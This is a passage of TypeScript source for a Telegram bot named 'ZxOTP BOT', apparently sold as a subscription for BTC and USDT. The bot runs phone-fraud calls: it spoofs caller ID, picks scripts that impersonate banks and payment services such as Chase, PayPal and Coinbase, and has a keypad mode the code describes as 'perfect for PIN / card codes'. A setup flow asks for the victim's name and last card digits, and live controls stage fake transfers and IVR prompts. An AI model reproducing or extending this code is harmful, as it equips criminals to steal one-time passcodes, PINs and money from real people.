            [btn.teal('Remove Hold',     'ivr_unhold',      E.CANCEL),
             btn.teal('Fake Transfer',   'ivr_fake_xfer',   E.GLOBE)],
            [btn.blue('Transfer to IVR', 'ivr_real_xfer',   E.ROCKET),
             btn.gold('Fake IVR Prompt', 'ivr_fake_prompt', E.STAR)],
          ],
        },
      });
    });
  });

  // /dpgp — immediate IVR panel ─────────────────────────────────────────────────
  b.command('dpgp', (ctx) => {
    gateCommand(b, ctx.from?.id, ctx.chat.id, () => {
      const m = new Msg()
        .emoji(E.TOOLS).sp().bi('Live Call Control').nl(2)
        .italic('Use while a call is active:');
      msgSend(b, ctx.chat.id, m, {
        reply_markup: {
          inline_keyboard: [
            [btn.red('Hang Up',          'ivr_hangup',      E.RED),
             btn.green('Hold',           'ivr_hold',        E.CHECK)],
            [btn.teal('Remove Hold',     'ivr_unhold',      E.CANCEL),
             btn.teal('Fake Transfer',   'ivr_fake_xfer',   E.GLOBE)],
            [btn.blue('Transfer to IVR', 'ivr_real_xfer',   E.ROCKET),
             btn.gold('Fake IVR Prompt', 'ivr_fake_prompt', E.STAR)],
          ],
        },
      });
    });
  });

  // Stub commands routed to their proper handlers ───────────────────────────────
  b.command(
    ['deletescript', 'myscripts', 'newscript', 'editscript', 'custom', 'purchase'],
    (ctx) => {
      gateCommand(b, ctx.from?.id, ctx.chat.id, () => {
        const cmd = ctx.message.text.replace('/', '').split(' ')[0]!.toLowerCase();
        const desc: Record<string, string> = {
          deletescript: 'Use /deletescript to remove a custom script from your list.',
          myscripts:    'Use /myscripts to view and manage your custom scripts.',
          newscript:    'Use /newscript to create a new custom call script.',
          editscript:   'Use /editscript to edit an existing custom script.',
          custom:       'Use /scripts to browse built-in scripts, or /myscripts for your own.',
          purchase:     'Use /PURCHASE to see BTC and USDT payment addresses.',
        };
        const m = new Msg()
          .emoji(E.CHECK).sp().bi('Command Tip').nl(2)
          .plain(desc[cmd] ?? 'Command received.');
        msgSend(b, ctx.chat.id, m);
      });
    },
  );

  b.command(['support', 'language', 'setvoice'], (ctx) => {
    const m = new Msg().emoji(E.SHIELD).sp().plain('Contact the owner for this option:');
    msgSend(b, ctx.chat.id, m, {
      reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
    });
  });

  // /redeem <KEY> ──────────────────────────────────────────────────────────────
  b.command('redeem', (ctx) => {
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;
    const parts  = ctx.message.text.trim().split(/\s+/);
    const key    = parts[1];

    if (!key) {
      const m = new Msg()
        .emoji(E.KEY).sp().bi('Redeem a License Key').nl(2)
        .emoji(E.STAR).sp().italic('Usage:').plain(' /redeem ZX-XXXX-XXXX-XXXX').nl(2)
        .blockquote(`Don't have a key? Buy one via ${OWNER_HANDLE}`);
      msgSend(b, chatId, m, {
        reply_markup: { inline_keyboard: [[btn.gold('See Plans', 'subscription', E.CROWN)]] },
      });
      return;
    }

    const result = redeemLicense(userId, key);
    if (!result.ok) {
      const reasonText: Record<string, string> = {
        not_found:        "That key doesn't exist. Double-check and try again.",
        already_redeemed: 'That key has already been redeemed by someone else.',
        expired:          'That key has already expired.',
      };
      const m = new Msg()
        .emoji(E.CROSS).sp().bi('Redeem Failed').nl(2)
        .emoji(E.WARNING).sp().italic(reasonText[result.reason] ?? 'Unknown error.');
      msgSend(b, chatId, m);
      return;
    }

    dbUpsertLicense(result.license);
    const m = new Msg()
      .emoji(E.CHECK).sp().bi('License Activated!').nl(2)
      .emoji(E.HOURGLASS).sp().italic(`Valid for ${formatDuration(result.license.durationMs)} from now.`).nl()
      .emoji(E.CROWN).sp().italic('All premium features are unlocked.').nl(2)
      .blockquote("You'll get a message here the moment it expires.");
    msgSend(b, chatId, m);
  });

  b.action('redeem_prompt', async (ctx) => {
    await ctx.answerCbQuery();
    const m = new Msg()
      .emoji(E.KEY).sp().bi('Redeem a License Key').nl(2)
      .emoji(E.STAR).sp().italic('Usage:').plain(' /redeem ZX-XXXX-XXXX-XXXX');
    await editOrSend(ctx, b, m);
  });

  // /license ───────────────────────────────────────────────────────────────────
  b.command('license', (ctx) => {
    const userId  = ctx.from.id;
    const license = getUserLicense(userId);
    const left    = timeLeftMs(userId);
    const m = new Msg();
    if (license && left && left > 0) {
      m.emoji(E.CROWN).sp().bi('License Status: Active').nl(2)
        .emoji(E.KEY).plain(' Key: ').code(license.key).nl()
        .emoji(E.HOURGLASS).plain(' Time left: ').bold(formatDuration(left));
    } else {
      m.emoji(E.CANCEL).sp().bi('License Status: None').nl(2)
        .emoji(E.KEY).sp().italic('Redeem a key with /redeem <KEY>');
    }
    msgSend(b, ctx.chat.id, m);
  });

  // /setspoof — save a default caller ID ────────────────────────────────────────
  b.command('setspoof', (ctx) => {
    gateCommand(b, ctx.from?.id, ctx.chat.id, async () => {
      const parts = ctx.message.text.trim().split(/\s+/);
      const num   = parts[1]?.trim();
      const chatId = ctx.chat.id;
      if (!num) {
        const cur = userSpoofNum.get(chatId);
        const m = new Msg()
          .emoji(E.GLOBE).sp().bi('Default Spoof (Caller ID)').nl(2)
          .emoji(E.CHECK).plain(' Current: ').bold(cur ?? 'not set — will be asked each call').nl(2)
          .italic('Usage: /setspoof +12025551234').nl()
          .italic('Use /setspoof clear to remove it.');
        await msgSend(b, chatId, m);
        return;
      }
      if (num === 'clear') {
        userSpoofNum.delete(chatId);
        const m = new Msg().emoji(E.CHECK).sp().bold('Default caller ID cleared.').nl().italic('Bot will ask for it each call.');
        await msgSend(b, chatId, m);
        return;
      }
      if (!num.startsWith('+')) {
        const m = new Msg().emoji(E.WARNING).sp().plain('Number must start with +  e.g. /setspoof +12025551234');
        await msgSend(b, chatId, m);
        return;
      }
      userSpoofNum.set(chatId, num);
      const m = new Msg()
        .emoji(E.CHECK).sp().bold('Default caller ID saved!').nl(2)
        .emoji(E.GLOBE).plain(' Spoof: ').code(num).nl(2)
        .italic('All future calls will use this number automatically.');
      await msgSend(b, chatId, m);
    });
  });

  // /mystats — user call statistics ──────────────────────────────────────────────
  b.command('mystats', (ctx) => {
    gateCommand(b, ctx.from?.id, ctx.chat.id, async () => {
      const chatId  = ctx.chat.id;
      const stats   = userCallStats.get(chatId);
      const spoof   = userSpoofNum.get(chatId);
      const license = getUserLicense(ctx.from.id);
      const left    = timeLeftMs(ctx.from.id);
      const active  = getActiveScript(chatId);
      const scriptName = active ? getScriptName(chatId, active) : 'None set';
      const voiceId = getUserVoice(chatId);
      const voiceName = getVoice(voiceId).label + ' ' + getVoice(voiceId).flag;
      const recall  = lastCallMap.get(chatId);
      const m = new Msg()
        .emoji(E.ROCKET).sp().bi('Your Stats').nl(2)
        .emoji(E.PHONE).plain(' Total calls:      ').bold(String(stats?.total ?? 0)).nl()
        .emoji(E.STAR).plain(' Active script:    ').bold(scriptName).nl()
        .emoji(E.STAR).plain(' Voice:            ').bold(voiceName).nl()
        .emoji(E.GLOBE).plain(' Default spoof:    ').bold(spoof ?? 'not set').nl()
        .emoji(E.KEY).plain(' License:          ').bold(license && left && left > 0 ? `✅ ${formatDuration(left)} left` : '❌ none').nl();
      if (recall) {
        m.nl().emoji(E.ANNOUNCE).plain(' Last call to: ').code(recall.VN).plain(` (${recall.mode})`).nl();
      }
      await msgSend(b, chatId, m, {
        reply_markup: {
          inline_keyboard: [
            [btn.blue('Browse Scripts', 'script_cats', E.ROCKET),
             btn.blue('Select Voice',   'voice_menu',  E.STAR)],
            ...(recall ? [[btn.green('Recall Last Call', 'recall_confirm', E.PHONE)]] : []),
          ],
        },
      } as any);
    });
  });

  // /recall — repeat the last call ──────────────────────────────────────────────
  b.command('recall', (ctx) => {
    gateCommand(b, ctx.from?.id, ctx.chat.id, async () => {
      const chatId = ctx.chat.id;
      const recall = lastCallMap.get(chatId);
      if (!recall) {
        const m = new Msg()
          .emoji(E.CANCEL).sp().bold('No previous call to recall.').nl()
          .italic('Make a call first, then /recall will repeat it.');
        await msgSend(b, chatId, m);
        return;
      }
      const scriptLbl = recall.scriptId ? getScriptName(chatId, recall.scriptId) : 'Default';
      const voiceLbl  = recall.voiceId ? getVoice(recall.voiceId).label : DEFAULT_VOICE.label;
      const m = new Msg()
        .emoji(E.PHONE).sp().bi('Recall Last Call').nl(2)
        .emoji(E.PHONE).plain(' Phone:   ').code(recall.VN).nl()
        .emoji(E.GLOBE).plain(' Spoof:   ').italic(recall.UN || 'default').nl()
        .emoji(E.BANK).plain(' Bank:    ').italic(recall.BN || 'n/a').nl()
        .emoji(E.SPEAK).plain(' Name:    ').italic(recall.vicName || 'n/a').nl()
        .emoji(E.CARD).plain(' Mode:    ').bold(recall.mode).nl()
        .emoji(E.ROBOT).plain(' Script:  ').italic(scriptLbl).nl()
        .emoji(E.STAR).plain(' Voice:   ').italic(voiceLbl).nl(2)
        .blockquote('Press CALL AGAIN to repeat with exactly the same settings, or /cancel');
      await msgSend(b, chatId, m, {
        reply_markup: {
          inline_keyboard: [
            [btn.green('Call Again', 'recall_confirm', E.PHONE),
             btn.red('Cancel',       'recall_cancel',   E.CANCEL)],
          ],
        },
      } as any);
    });
  });

  // /otp — quick OTP call (no setup questions) ──────────────────────────────────
  b.command('otp', (ctx) => {
    gateCommand(b, ctx.from?.id, ctx.chat.id, async () => {
      const chatId = ctx.chat.id;
      resetFlow(chatId);
      const flow        = getFlow(chatId);
      flow.deviceName   = 'OTP';
      flow.quickMode    = true;
      flow.callMode     = 'speech';
      // Auto-use stored spoof
      const spoof = userSpoofNum.get(chatId);
      if (spoof) flow.UN = spoof;
      const m = new Msg()
        .emoji(E.LIGHTNING).sp().bi('Quick OTP Mode').nl(2)
        .emoji(E.CHECK).sp().italic('No setup — just enter the target number and call goes out immediately.').nl()
        .emoji(E.ROBOT).sp().italic(`Active script: ${getActiveScript(chatId) ? getScriptName(chatId, getActiveScript(chatId)!) : 'Default'}`).nl(2)
        .emoji(E.PHONE).sp().bold('Enter the TARGET phone number:');
      const sent = await msgSend(b, chatId, m);
      flow.lastBotMsgId = (sent as any).message_id;
    });
  });

  // /dtmf — DTMF keypad capture mode ────────────────────────────────────────────
  b.command('dtmf', (ctx) => {
    gateCommand(b, ctx.from?.id, ctx.chat.id, async () => {
      const chatId = ctx.chat.id;
      resetFlow(chatId);
      const flow        = getFlow(chatId);
      flow.deviceName   = 'DTMF';
      flow.callMode     = 'dtmf';
      const m = new Msg()
        .emoji(E.PHONE).sp().bi('DTMF Keypad Mode').nl(2)
        .emoji(E.CHECK).sp().italic('Target will be asked to enter digits on their keypad — perfect for PIN / card codes.').nl(2)
        .emoji(E.PHONE).sp().bold('Enter the TARGET phone number:');
      const sent = await msgSend(b, chatId, m);
      flow.lastBotMsgId = (sent as any).message_id;
    });
  });

  // Call-mode commands ─────────────────────────────────────────────────────────
  b.command(
    ['call', 'callerid', 'aboutme', 'speed', 'coinbase',
     'bank', 'bank2', 'vbv', 'pin', 'pin2', 'venmo', 'cashapp',
     'applepay', 'googlepay', 'samsung', 'whatsapp', 'amazon',
     'icloud', 'microsoft', 'sim', 'transfer', 'crypto', 'wallet',
     'zelle', 'card3d', 'instagram', 'email', 'otp2'],
    (ctx) => {
      gateCommand(b, ctx.from?.id, ctx.chat.id, async () => {
        const chatId   = ctx.chat.id;
        const cmdRaw   = ctx.message.text.replace('/', '').split(' ')[0]!.toUpperCase();
        resetFlow(chatId);
        const flow        = getFlow(chatId);
        flow.deviceName   = cmdRaw;

        // DTMF mode for PIN/card commands
        if (['PIN', 'PIN2', 'CARD3D'].includes(cmdRaw)) flow.callMode = 'dtmf';

        // Auto-select script based on command
        const scriptMap: Record<string, string> = {
          PAYPAL: 'pay_paypal', VENMO: 'pay_venmo', CASHAPP: 'pay_cashapp',
          ZELLE: 'pay_zelle', COINBASE: 'cry_coinbase', APPLEPAY: 'tec_apple',
          GOOGLEPAY: 'pay_gpay', SAMSUNG: 'tec_apple', WHATSAPP: 'tec_whatsapp',
          AMAZON: 'ret_amazon', ICLOUD: 'tec_apple', MICROSOFT: 'tec_microsoft',
          SIM: 'tel_att', TRANSFER: 'us_chase', CRYPTO: 'cry_binance',
          WALLET: 'pay_paypal', BANK: 'us_chase', BANK2: 'us_boa',
          VBV: 'card_visa', CARD3D: 'card_visa', PIN: 'us_wells', PIN2: 'us_wells',
          INSTAGRAM: 'tec_instagram', EMAIL: 'tec_microsoft', OTP2: 'tec_whatsapp',
          SPEED: 'us_chase', CALLERID: 'us_chase', ABOUTME: 'us_chase',
        };
        const autoId = scriptMap[cmdRaw];
        if (autoId) {
          flow.autoScript = autoId;
          setActiveScript(chatId, autoId);
        }

        const m = buildPhonePrompt('Target Phone Number');
        const sent = await msgSend(b, chatId, m);
        flow.lastBotMsgId = (sent as any).message_id;
      });
    },
  );

  // /help ──────────────────────────────────────────────────────────────────────
  b.command('help', async (ctx) => {
    await deleteLastPanel(b, ctx.chat.id);
    const sent = await msgSend(b, ctx.chat.id, buildHelp(), {
      reply_markup: {
        inline_keyboard: [
          [btn.blue('CMD Guide', 'more-C', E.ROCKET)],
          [btn.teal('Admin Chat',    'admin',  E.SPEAK)],
          [btn.url('Contact Owner',   OWNER_URL, E.ENVELOPE)],
        ],
      },
    });
    lastPanelMsg.set(ctx.chat.id, (sent as any).message_id);
  });

  // /proceed ───────────────────────────────────────────────────────────────────
  b.command('proceed', (ctx) => {
    const m = new Msg()
      .emoji(E.MONEY).sp().bi('Select Payment Method').nl(2)
      .emoji(E.CARD).sp().italic('Choose your wallet to make payment fast').nl(2)
      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
    msgSend(b, ctx.chat.id, m, {
      reply_markup: {
        inline_keyboard: [
          [btn.gold('Bitcoin (BTC)', 'BTC', E.FIRE),
           btn.green('USDT TRC20',  'TRC', E.CHECK)],
          [btn.url('Contact Owner',   OWNER_URL, E.ENVELOPE)],
        ],
      },
    });
  });

  // /admin ─────────────────────────────────────────────────────────────────────
  b.command('admin', async (ctx) => {
    if (isAdmin(ctx.from?.id)) {
      await deleteLastPanel(b, ctx.chat.id);
      const sent = await msgSend(b, ctx.chat.id, buildAdminPanel(), {
        reply_markup: adminPanelKeyboard(),
      } as any);
      lastPanelMsg.set(ctx.chat.id, (sent as any).message_id);
      return;
    }
    const m = new Msg()
      .emoji(E.SPEAK).sp().bold('Admin Contact').nl(2)
      .plain('Click ').bold(OWNER_HANDLE).plain(' to chat with the admin for help and complaints.');
    msgSend(b, ctx.chat.id, m, {
      reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
    });
  });

  // /more ──────────────────────────────────────────────────────────────────────
  b.command('more', (ctx) => { msgSend(b, ctx.chat.id, buildMoreInfo()); });

  // /scripts ─── Browse & select built-in scripts ──────────────────────────────
  b.command('scripts', async (ctx) => {
    await gateCmd(ctx, async () => {
      await msgSend(b, ctx.chat.id, buildScriptCatMenu(), {
        reply_markup: scriptCatKeyboard(),
      } as any);
    });
  });

  // /myscripts ─── List user custom scripts ────────────────────────────────────
  b.command('myscripts', async (ctx) => {
    await gateCmd(ctx, async () => {
      const chatId = ctx.chat.id;
      const list   = getUserScripts(chatId);
      const active = getActiveScript(chatId);
      const m      = new Msg().emoji(E.STAR).sp().bi('My Custom Scripts').nl(2);
      if (list.length === 0) {
        m.italic('No custom scripts yet.').nl(2)
         .emoji(E.TOOLS).plain(' Use /newscript to create one.');
      } else {
        for (const s of list) {
          const tick = s.id === active ? ' ✅' : '';
          m.emoji(E.CHECK).plain(' ').bold(s.name + tick).nl()
           .plain('  ').italic(s.message.slice(0, 80) + (s.message.length > 80 ? '…' : '')).nl();
        }
      }
      await msgSend(b, chatId, m, {
        reply_markup: {
          inline_keyboard: [
            [btn.green('New Script', 'script_new', E.TOOLS),
             btn.blue('Browse All Scripts', 'script_cats', E.ROCKET)],
          ],
        },
      } as any);
    });
  });

  // /newscript ─── Create a custom script ──────────────────────────────────────
  b.command('newscript', async (ctx) => {
    await gateCmd(ctx, async () => {
      scriptPending.set(ctx.chat.id, { step: 'name' });
      const m = new Msg()
        .emoji(E.TOOLS).sp().bold('New Custom Script').nl(2)
        .italic('Step 1 of 2 — send the script name (e.g. "PayPal Verify"):');
      await msgSend(b, ctx.chat.id, m);
    });
  });
  b.command('add_script', async (ctx) => {
    await gateCmd(ctx, async () => {
      scriptPending.set(ctx.chat.id, { step: 'name' });
      const m = new Msg()
        .emoji(E.TOOLS).sp().bold('New Custom Script').nl(2)
        .italic('Step 1 of 2 — send the script name:');
      await msgSend(b, ctx.chat.id, m);
    });
  });

  // /editscript ─── Edit a custom script ───────────────────────────────────────
  b.command('editscript', async (ctx) => {
    await gateCmd(ctx, async () => {
      const chatId = ctx.chat.id;
      const list   = getUserScripts(chatId);
      if (list.length === 0) {
        await msgSend(b, chatId, new Msg().emoji(E.CANCEL).sp().italic('No custom scripts to edit. Use /newscript first.'));
        return;
      }
      const keyboard = list.map(s => [btn.blue(s.name, `script_edit:${s.id}`, E.TOOLS)]);
      keyboard.push([btn.blue('Back', 'script_cats', E.CANCEL)]);
      await msgSend(b, chatId,
        new Msg().emoji(E.TOOLS).sp().bold('Edit Script').nl(2).italic('Choose a script to edit:'), {
          reply_markup: { inline_keyboard: keyboard },
        } as any);
    });
  });

  // /deletescript ─── Delete a custom script ───────────────────────────────────
  b.command('deletescript', async (ctx) => {
    await gateCmd(ctx, async () => {
      const chatId = ctx.chat.id;
      const list   = getUserScripts(chatId);
      if (list.length === 0) {
        await msgSend(b, chatId, new Msg().emoji(E.CANCEL).sp().italic('No custom scripts to delete.'));
        return;
      }
      const keyboard = list.map(s => [btn.red(s.name, `script_del_confirm:${s.id}`, E.CANCEL)]);
      keyboard.push([btn.blue('Cancel', 'script_cats', E.CANCEL)]);
      await msgSend(b, chatId,
        new Msg().emoji(E.RED).sp().bold('Delete Script').nl(2).italic('Choose a script to delete:'), {
          reply_markup: { inline_keyboard: keyboard },
        } as any);
    });
  });

  // /voices ─── Browse & select voices ─────────────────────────────────────────
  b.command('voices', async (ctx) => {
    await gateCmd(ctx, async () => {
      const chatId = ctx.chat.id;
      const cur    = getUserVoice(chatId);
      await msgSend(b, chatId, buildVoiceMenu(chatId), {
        reply_markup: voiceKeyboard(cur),
      } as any);
    });
  });
}

// ── Info panel message and keyboard helpers ───────────────────────────────────

function buildInfoMsg(): Msg {
  return new Msg()
    .emoji(E.CROWN).sp().bi('ZxOTP BOT').sp().emoji(E.CROWN).nl(2)
    .emoji(E.LIGHTNING).sp().italic('OTP calls · Spoof caller ID · Live IVR control').nl(2)
    .emoji(E.HOURGLASS).plain('  3 Days       — ').bold(PRICE_3D).nl()
    .emoji(E.LIGHTNING).plain('  Weekly       — ').bold(PRICE_WK).nl()
    .emoji(E.STAR).plain('  Monthly      — ').bold(PRICE_MO).nl()
    .emoji(E.CROWN).plain('  VIP Lifetime — ').bold(PRICE_VIP).nl(2)
    .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
}

function infoKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [btn.gold('Buy a Plan',    'subscription', E.CROWN),
         btn.blue('CMD Guide',    'more-C',       E.ROCKET)],
        [btn.green('Pay Now',     'payment',      E.MONEY),
         btn.url('Contact Owner',  OWNER_URL,     E.ENVELOPE)],
      ],
    },
  };
}

// ══════════════════════════════════════════════════════════════════════════════
// Script & Voice menu builders
// ══════════════════════════════════════════════════════════════════════════════

const SCRIPTS_PER_PAGE = 8;

function buildScriptCatMenu(): Msg {
  const total = BUILTIN_SCRIPTS.length;
  return new Msg()
    .emoji(E.ROCKET).sp().bi('Scripts Library').nl(2)
    .emoji(E.CHECK).plain(` ${total} built-in scripts across all categories.`).nl()
    .italic('Browse by category, preview, and activate any script for your next call.').nl(2)
    .emoji(E.TOOLS).plain(' Use /newscript to create a custom script.');
}

function scriptCatKeyboard() {
  const cats = allCategories().filter(c => c !== 'custom');
  const rows: any[][] = [];
  for (let i = 0; i < cats.length; i += 2) {
    const row: any[] = [btn.blue(CAT_LABEL[cats[i]!], `script_cat:${cats[i]}:0`, E.ROCKET)];
    if (cats[i + 1]) row.push(btn.blue(CAT_LABEL[cats[i + 1]!], `script_cat:${cats[i + 1]}:0`, E.ROCKET));
    rows.push(row);
  }
  rows.push([btn.green('My Custom Scripts', 'script_my', E.STAR)]);
  rows.push([btn.teal('New Custom Script', 'script_new', E.TOOLS)]);
  return { inline_keyboard: rows };
}

function buildScriptListMsg(cat: ScriptCategory, page: number): Msg {
  const scripts = cat === 'custom' ? [] : getScriptsByCategory(cat);
  const total   = scripts.length;
  const start   = page * SCRIPTS_PER_PAGE;
  const slice   = scripts.slice(start, start + SCRIPTS_PER_PAGE);
  const m = new Msg()
    .emoji(E.ROCKET).sp().bi(CAT_LABEL[cat]).nl(2)
    .italic(`${total} scripts · page ${page + 1} of ${Math.ceil(total / SCRIPTS_PER_PAGE) || 1}`).nl(2);
  for (const s of slice) {
    m.emoji(E.CHECK).plain(' ').bold(s.name).plain(` [${s.country}]`).nl()
     .plain('  ').italic(s.message.slice(0, 70) + '…').nl();
  }
  return m;
}

function scriptListKeyboard(cat: ScriptCategory, page: number, chatId: number) {
  const scripts = cat === 'custom' ? [] : getScriptsByCategory(cat);
  const total   = scripts.length;
  const start   = page * SCRIPTS_PER_PAGE;
  const slice   = scripts.slice(start, start + SCRIPTS_PER_PAGE);
  const rows: any[][] = slice.map(s => [
    btn.blue(s.name, `script_preview:${s.id}`, E.STAR),
    btn.green('Use', `script_use:${s.id}`, E.CHECK),
  ]);
  const nav: any[] = [];
  if (page > 0)                              nav.push(btn.teal('◀ Prev', `script_cat:${cat}:${page - 1}`, E.CANCEL));
  if (start + SCRIPTS_PER_PAGE < total)      nav.push(btn.teal('Next ▶', `script_cat:${cat}:${page + 1}`, E.ROCKET));
  if (nav.length) rows.push(nav);
  rows.push([btn.blue('Back to Categories', 'script_cats', E.GLOBE)]);
  return { inline_keyboard: rows };
}

// ── Voice menu ────────────────────────────────────────────────────────────────

function buildVoiceMenu(chatId: number): Msg {
  const cur = getUserVoice(chatId);
  const v   = getVoice(cur);
  return new Msg()
    .emoji(E.STAR).sp().bi('Select Voice').nl(2)
    .plain('Active: ').bold(`${v.flag} ${v.label}`).plain(` — ${v.accent}`).nl(2)
    .italic('Preview to hear a sample · Use to activate.');
}

function voiceKeyboard(currentVoiceId: string) {
  const rows: any[][] = VOICES.map(v => {
    const tick = v.id === currentVoiceId ? ' ✅' : '';
    return [
      btn.blue(`${v.flag} ${v.label} — ${v.accent}${tick}`, `voice_preview:${v.id}`, E.STAR),
      btn.green('Use', `voice_use:${v.id}`, E.CHECK),
    ];
  });
  return { inline_keyboard: rows };
}

// ══════════════════════════════════════════════════════════════════════════════
// Multi-step message handler
// ══════════════════════════════════════════════════════════════════════════════

function registerMessageHandler(b: Telegraf): void {
  b.on(message('text'), async (ctx) => {
    const chatId = ctx.chat.id;
    const text   = ctx.message.text.trim();

    // Skip real commands (handled by command handlers)
    const textLc = text.toLowerCase();
    const isFlowConfirmReply = getFlow(chatId).callCount === 6 && (textLc === '/accept' || textLc === '/decline');
    if (text.startsWith('/') && !isFlowConfirmReply) return;

    // Admin two-step prompts take priority
    const pending = adminPrompt.get(chatId);
    if (pending && isAdmin(ctx.from?.id)) {
      adminPrompt.delete(chatId);
      // Delete user's message for clean UX
      try { await ctx.deleteMessage(); } catch { /* ignore */ }
      await handleAdminPromptReply(b, chatId, pending, text, ctx.from?.username);
      return;
    }

    const flow = getFlow(chatId);

    // Helper: delete old prompt, send new one, store msg id
    async function nextPrompt(m: Msg, extra: Record<string, unknown> = {}): Promise<void> {
      // Delete previous bot prompt
      if (flow.lastBotMsgId) {
        try { await b.telegram.deleteMessage(chatId, flow.lastBotMsgId); } catch { /* ignore */ }
        flow.lastBotMsgId = undefined;
      }
      // Delete user's input message for clean UX
      try { await ctx.deleteMessage(); } catch { /* ignore */ }
      const sent = await msgSend(b, chatId, m, extra);
      flow.lastBotMsgId = (sent as any).message_id;
    }

    // ── Pending script creation (2-step flow) ─────────────────────────────────
    const sp = scriptPending.get(chatId);
    if (sp) {
      if (sp.step === 'name') {
        scriptPending.set(chatId, { step: 'message', name: text, editId: sp.editId });
        const m2 = new Msg()
          .emoji(E.TOOLS).sp().bold(`Script: "${text}"`).nl(2)
          .italic('Step 2 of 2 — send the full TTS message the voice will speak:');
        await msgSend(b, chatId, m2);
        return;
      } else if (sp.step === 'message' && sp.name) {
        scriptPending.delete(chatId);
        if (sp.editId) {
          editUserScript(chatId, sp.editId, { name: sp.name, message: text });
          const m2 = new Msg()
            .emoji(E.CHECK).sp().bold('Script updated!').nl(2)
            .bold(sp.name).nl()
            .italic(text.slice(0, 100) + (text.length > 100 ? '…' : ''));
          await msgSend(b, chatId, m2, {
            reply_markup: { inline_keyboard: [[btn.blue('Browse Scripts', 'script_cats', E.ROCKET)]] },
          } as any);
        } else {
          const voice = getUserVoice(chatId);
          const saved = addUserScript(chatId, sp.name, text, voice);
          setActiveScript(chatId, saved.id);
          const m2 = new Msg()
            .emoji(E.CHECK).sp().bold('Custom script saved & activated!').nl(2)
            .bold(saved.name).nl()
            .italic(text.slice(0, 100) + (text.length > 100 ? '…' : '')).nl(2)
            .emoji(E.ROBOT).plain(' This script will be used on your next call.');
          await msgSend(b, chatId, m2, {
            reply_markup: { inline_keyboard: [[btn.blue('Browse Scripts', 'script_cats', E.ROCKET)]] },
          } as any);
        }
        return;
      }
    }

    // ── callCount === 0: target phone number ────────────────────────────────
    if (flow.callCount === 0 && checkNumber(text.replace(/[\s\-()]/g, ''))) {
      flow.VN = text.trim().replace(/[\s\-()]/g, '');
      const savedSpoof = userSpoofNum.get(chatId);

      // Quick mode: skip all setup questions, call immediately
      if (flow.quickMode) {
        flow.UN       = savedSpoof ?? process.env['SIGNALWIRE_SPOOF_NUMBER'] ?? process.env['SIGNALWIRE_FROM_NUMBER'] ?? '';
        flow.callCount = 6;
        flow.scriptId  = flow.autoScript ?? getActiveScript(chatId);
        flow.voiceId   = getUserVoice(chatId);
        // Delete user's number message for clean UX
        try { await ctx.deleteMessage(); } catch { /* ignore */ }
        await placeCallNow(b, chatId, flow);
        resetFlow(chatId);
        return;
      }

      // If user has a saved spoof number, skip the spoof prompt
      if (savedSpoof) {
        flow.UN        = savedSpoof;
        flow.callCount = 2;
        await nextPrompt(new Msg()
          .emoji(E.GLOBE).sp().bold('Caller ID auto-set:').sp().code(savedSpoof).nl(2)
          .emoji(E.BANK).sp().bold('Bank / Institution name (or press any key to skip):'));
        return;
      }

      flow.callCount = 1;
      await nextPrompt(new Msg()
        .emoji(E.GLOBE).sp().bold('Caller ID (optional)').nl(2)
        .italic('Enter a spoof number to show on the target\'s caller ID.').nl()
        .italic('Include + and country code — e.g. +12025551234').nl(2)
        .blockquote('Type skip to use your default number'));
      return;
    }

    if (flow.callCount === 1) {
      // Validate caller ID — must be a phone number or 'skip'
      const cleaned = text.trim().replace(/[\s\-()]/g, '');
      if (text.toLowerCase() !== 'skip' && !checkNumber(cleaned)) {
        await nextPrompt(new Msg()
          .emoji(E.WARNING).sp().bold('Invalid caller ID format.').nl(2)
          .italic('Enter a phone number with + and country code, e.g. +12025551234').nl()
          .italic('Or type ').bold('skip').italic(' to use the default number.'));
        flow.callCount = 1; // stay on this step
        return;
      }
      flow.UN = text.toLowerCase() === 'skip' ? (process.env['SIGNALWIRE_SPOOF_NUMBER'] ?? process.env['SIGNALWIRE_FROM_NUMBER'] ?? '') : cleaned;
      flow.callCount = 2;
      await nextPrompt(new Msg()
        .emoji(E.BANK).sp().bold('Bank / Institution name:').nl()
        .italic('(e.g. Chase Bank, PayPal, Coinbase — or type skip)'));
      return;
    }
    if (flow.callCount === 2) {
      flow.BN = text === 'skip' ? '' : text; flow.callCount = 3;
      await nextPrompt(new Msg()
        .emoji(E.SPEAK).sp().bold("Victim's name:").nl()
        .italic('(e.g. John Smith — or type skip)'));
      return;
    }
    if (flow.callCount === 3) {
      flow.vicName = text === 'skip' ? '' : text; flow.callCount = 4;
      await nextPrompt(new Msg()
        .emoji(E.CARD).sp().bold('Last 4 digits of card / account:').nl()
        .italic('(type skip to omit)'));
      return;
    }
    if (flow.callCount === 4) {
      flow.LD = text === 'skip' ? '' : text; flow.callCount = 5;
      if (flow.LD) {
        await nextPrompt(new Msg().emoji(E.CHECK).sp().bold('Confirm last 4 digits:'));
      } else {
        flow.callCount = 6;
        flow.scriptId = flow.autoScript ?? getActiveScript(chatId);
        flow.voiceId  = getUserVoice(chatId);
        const scriptLbl = flow.scriptId ? getScriptName(chatId, flow.scriptId) : 'Default';
        const voiceLbl  = getVoice(flow.voiceId).label + ' ' + getVoice(flow.voiceId).flag;
        await nextPrompt(buildReviewMsg(flow, scriptLbl, voiceLbl));
      }
      return;
    }
    if (flow.callCount === 5) {
      flow.LD = text; flow.callCount = 6;
      flow.scriptId = flow.autoScript ?? getActiveScript(chatId);
      flow.voiceId  = getUserVoice(chatId);
      const scriptLbl = flow.scriptId ? getScriptName(chatId, flow.scriptId) : 'Default';
      const voiceLbl  = getVoice(flow.voiceId).label + ' ' + getVoice(flow.voiceId).flag;
      await nextPrompt(buildReviewMsg(flow, scriptLbl, voiceLbl));
      return;
    }

    if (flow.callCount === 6) {
      const textLower = text.toLowerCase();
      if (textLower === '/decline') {
        if (flow.lastBotMsgId) {
          try { await b.telegram.deleteMessage(chatId, flow.lastBotMsgId); } catch { /* ignore */ }
        }
        try { await ctx.deleteMessage(); } catch { /* ignore */ }
        resetFlow(chatId);
        msgSend(b, chatId, new Msg().emoji(E.CANCEL).sp().plain('Cancelled — /call to start over'));
        return;
      }

      if (textLower === '/accept') {
        if (flow.lastBotMsgId) {
